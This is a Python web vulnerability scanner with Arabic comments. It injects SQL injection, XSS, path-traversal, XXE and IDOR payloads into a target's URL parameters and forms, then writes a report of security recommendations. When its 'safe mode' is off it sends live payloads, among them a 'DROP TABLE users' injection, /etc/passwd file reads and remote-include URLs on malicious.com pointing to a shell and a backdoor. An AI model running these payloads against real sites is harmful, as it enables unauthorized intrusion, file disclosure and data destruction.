import requests
import json
import re
import time
import urllib.parse
from urllib.parse import urljoin, urlparse, parse_qs
from typing import Dict, List, Any

class ExploitationTester:
    """ماسح متقدم لاختبار استغلال الثغرات في وضع آمن"""
    
    def __init__(self, safe_mode: bool = True):
        self.safe_mode = safe_mode
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'SecurityTestingBot/1.0 (Safe Mode)',
            'Accept': '*/*',
            'Connection': 'close'
        })
        
        # Payloads آمنة للاختبار
        self.safe_payloads = {
            'sql_injection': [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')"
            ],
            'lfi': [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "/etc/passwd"
            ],
            'rfi': [
                "http://malicious.com/shell.txt",
                "ftp://malicious.com/backdoor.php"
            ],
            'idor': [
                "1", "2", "3", "999", "admin"
            ],
            'xxe': [
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>"
            ]
        }
        
        # Payloads وهمية للاختبار الآمن
        self.test_payloads = {
            'sql_injection': [
                "' OR '1'='1'",
                "' UNION SELECT 1--",
                "' AND 1=1--"
            ],
            'xss': [
                "<script>console.log('test')</script>",
                "<img src=x onerror=console.log('test')>",
                "javascript:void(0)"
            ],
            'lfi': [
                "test.txt",
                "dummy.php",
                "config.txt"
            ],
            'rfi': [
                "http://example.com/test.txt",
                "https://example.com/dummy.php"
            ],
            'idor': [
                "100", "101", "102", "current"
            ],
            'xxe': [
                "<?xml version=\"1.0\"?><test>data</test>",
                "<root><element>test</element></root>"
            ]
        }
    
    def test_sql_injection(self, target_url: str) -> Dict[str, Any]:
        """اختبار SQL Injection في وضع آمن"""
        results = []
        payloads = self.test_payloads['sql_injection'] if self.safe_mode else self.safe_payloads['sql_injection']
        
        for payload in payloads:
            try:
                # اختبار GET parameters
                parsed = urlparse(target_url)
                params = parse_qs(parsed.query)
                
                for param in params:
                    test_url = target_url.replace(f"{param}={params[param][0]}", 
                                                f"{param}={payload}")
                    
                    response = self.session.get(test_url, timeout=5)
                    
                    # تحليز الاستجابة للبحث عن علامات SQL injection
                    indicators = self._detect_sql_indicators(response.text)
                    
                    if indicators:
                        results.append({
                            'vulnerability_type': 'SQL Injection',
                            'target_url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'indicators': indicators,
                            'safe_mode': self.safe_mode,
                            'risk_level': 'HIGH' if not self.safe_mode else 'INFO'
                        })
                
                # اختبار POST data
                post_data = {param: payload for param in params}
                if post_data:
                    response = self.session.post(target_url, data=post_data, timeout=5)
                    indicators = self._detect_sql_indicators(response.text)
                    
                    if indicators:
                        results.append({
                            'vulnerability_type': 'SQL Injection (POST)',
                            'target_url': target_url,
                            'payload': payload,
                            'indicators': indicators,
                            'safe_mode': self.safe_mode,
                            'risk_level': 'HIGH' if not self.safe_mode else 'INFO'
                        })
                        
            except Exception as e:
                results.append({
                    'vulnerability_type': 'SQL Injection',
                    'target_url': target_url,
                    'error': str(e),
                    'safe_mode': self.safe_mode,
                    'risk_level': 'ERROR'
                })
        
        return {
            'vulnerability_type': 'sql_injection',
            'results': results,
            'tested_payloads': len(payloads),
            'vulnerabilities_found': len([r for r in results if 'indicators' in r])
        }
    
    def test_xss(self, target_url: str) -> Dict[str, Any]:
        """اختبار XSS في وضع آمن"""
        results = []
        payloads = self.test_payloads['xss'] if self.safe_mode else self.safe_payloads['xss']
        
        for payload in payloads:
            try:
                # اختبار في معلمات URL
                parsed = urlparse(target_url)
                params = parse_qs(parsed.query)
                
                for param in params:
                    test_url = target_url.replace(f"{param}={params[param][0]}", 
                                                f"{param}={payload}")
                    
                    response = self.session.get(test_url, timeout=5)
                    
                    if payload in response.text:
                        results.append({
                            'vulnerability_type': 'XSS',
                            'target_url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'reflected': True,
                            'safe_mode': self.safe_mode,
                            'risk_level': 'MEDIUM' if not self.safe_mode else 'INFO'
                        })
                
                # اختبار POST forms
                form_data = {'input': payload, 'comment': payload}
                response = self.session.post(target_url, data=form_data, timeout=5)
                
                if payload in response.text:
                    results.append({
                        'vulnerability_type': 'XSS (POST)',
                        'target_url': target_url,
                        'payload': payload,
                        'reflected': True,
                        'safe_mode': self.safe_mode,
                        'risk_level': 'MEDIUM' if not self.safe_mode else 'INFO'
                    })
                    
            except Exception as e:
                results.append({
                    'vulnerability_type': 'XSS',
                    'target_url': target_url,
                    'error': str(e),
                    'safe_mode': self.safe_mode,
                    'risk_level': 'ERROR'
                })
        
        return {
            'vulnerability_type': 'xss',
            'results': results,
            'tested_payloads': len(payloads),
            'vulnerabilities_found': len([r for r in results if 'reflected' in r])
        }
    
    def test_lfi(self, target_url: str) -> Dict[str, Any]:
        """اختبار Local File Inclusion في وضع آمن"""
        results = []
        payloads = self.test_payloads['lfi'] if self.safe_mode else self.safe_payloads['lfi']
        
        for payload in payloads:
            try:
                parsed = urlparse(target_url)
                params = parse_qs(parsed.query)
                
                for param in params:
                    test_url = target_url.replace(f"{param}={params[param][0]}", 
                                                f"{param}={payload}")
                    
                    response = self.session.get(test_url, timeout=5)
                    
                    # في وضع الاختبار الآمن، نبحث عن علامات محددة
                    indicators = self._detect_lfi_indicators(response.text)
                    
                    if indicators:
                        results.append({
                            'vulnerability_type': 'LFI',
                            'target_url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'indicators': indicators,
                            'safe_mode': self.safe_mode,
                            'risk_level': 'HIGH' if not self.safe_mode else 'INFO'
                        })
                        
            except Exception as e:
                results.append({
                    'vulnerability_type': 'LFI',
                    'target_url': target_url,
                    'error': str(e),
                    'safe_mode': self.safe_mode,
                    'risk_level': 'ERROR'
                })
        
        return {
            'vulnerability_type': 'lfi',
            'results': results,
            'tested_payloads': len(payloads),
            'vulnerabilities_found': len([r for r in results if 'indicators' in r])
        }
    
    def test_idor(self, target_url: str) -> Dict[str, Any]:
        """اختبار Insecure Direct Object References في وضع آمن"""
        results = []
        payloads = self.test_payloads['idor'] if self.safe_mode else self.safe_payloads['idor']
        
        for payload in payloads:
            try:
                # استبدال الأرقام في URL
                pattern = r'(\d+)'
                test_url = re.sub(pattern, payload, target_url)
                
                response = self.session.get(test_url, timeout=5)
                
                # تحليز الاستجابة
                if response.status_code == 200:
                    # في وضع الآمن، نتحقق من التغيير في المحتوى
                    results.append({
                        'vulnerability_type': 'IDOR',
                        'target_url': test_url,
                        'payload': payload,
                        'status_code': response.status_code,
                        'content_length': len(response.content),
                        'safe_mode': self.safe_mode,
                        'risk_level': 'MEDIUM' if not self.safe_mode else 'INFO'
                    })
                    
            except Exception as e:
                results.append({
                    'vulnerability_type': 'IDOR',
                    'target_url': target_url,
                    'error': str(e),
                    'safe_mode': self.safe_mode,
                    'risk_level': 'ERROR'
                })
        
        return {
            'vulnerability_type': 'idor',
            'results': results,
            'tested_payloads': len(payloads),
            'vulnerabilities_found': len([r for r in results if r.get('status_code') == 200])
        }
    
    def _detect_sql_indicators(self, response_text: str) -> List[str]:
        """الكشف عن علامات SQL injection"""
        indicators = []
        sql_errors = [
            'mysql_fetch_array',
            'ORA-',
            'Microsoft OLE DB Provider',
            'SQLServer JDBC Driver',
            'PostgreSQL query failed',
            'Warning: mysql_',
            'MySQL server version',
            'SQL syntax.*MySQL',
            'Warning.*mysqli_',
            'valid MySQL result',
            'check the manual that corresponds to your MySQL server version'
        ]
        
        for error in sql_errors:
            if re.search(error, response_text, re.IGNORECASE):
                indicators.append(error)
        
        return indicators
    
    def _detect_lfi_indicators(self, response_text: str) -> List[str]:
        """الكشف عن علامات LFI"""
        indicators = []
        lfi_patterns = [
            'root:',
            'daemon:',
            'bin:',
            '/bin/bash',
            '/etc/passwd'
        ]
        
        for pattern in lfi_patterns:
            if pattern in response_text:
                indicators.append(pattern)
        
        return indicators
    
    def run_batch_tests(self, target_url: str, vulnerability_types: List[str]) -> Dict[str, Any]:
        """تشغيل اختبارات متعددة في وضع آمن"""
        all_results = []
        summary = {
            'total_tests': 0,
            'successful_exploits': 0,
            'failed_tests': 0,
            'safe_mode': self.safe_mode
        }
        
        vulnerability_map = {
            'sql_injection': self.test_sql_injection,
            'xss': self.test_xss,
            'lfi': self.test_lfi,
            'idor': self.test_idor
        }
        
        for vuln_type in vulnerability_types:
            if vuln_type in vulnerability_map:
                result = vulnerability_map[vuln_type](target_url)
                all_results.append(result)
                summary['total_tests'] += result['tested_payloads']
                summary['successful_exploits'] += result['vulnerabilities_found']
        
        summary['failed_tests'] = summary['total_tests'] - summary['successful_exploits']
        
        return {
            'target_url': target_url,
            'summary': summary,
            'detailed_results': all_results,
            'safe_mode': self.safe_mode,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }
    
    def generate_report(self, results: Dict[str, Any]) -> str:
        """توليد تقرير شامل"""
        report = f"""
# تقرير اختبار استغلال الثغرات

## معلومات عامة
- الموقع المستهدف: {results['target_url']}
- وضع الاختبار: {'آمن' if results['safe_mode'] else 'كامل'}
- التاريخ: {results['timestamp']}

## ملخص النتائج
- إجمالي الاختبارات: {results['summary']['total_tests']}
- الثغرات المكتشفة: {results['summary']['successful_exploits']}
- الاختبارات الفاشلة: {results['summary']['failed_tests']}

## توصيات الأمان
1. استخدم معلمات مدققة في جميع مدخلات المستخدم
2. استخدم prepared statements لمنع SQL injection
3. قم بتعقيم مدخلات HTML لمنع XSS
4. تحقق من صلاحية الملفات في عمليات include
5. استخدم معرفات غير متوقعة وتحقق من الصلاحيات

## تنبيه
هذا التقرير تم إنشاؤه في وضع الاختبار الآمن. للحصول على نتائج أكثر دقة، قم بتشغيل الاختبار في وضع الإنتاج مع تصاريح مناسبة.
"""
        return report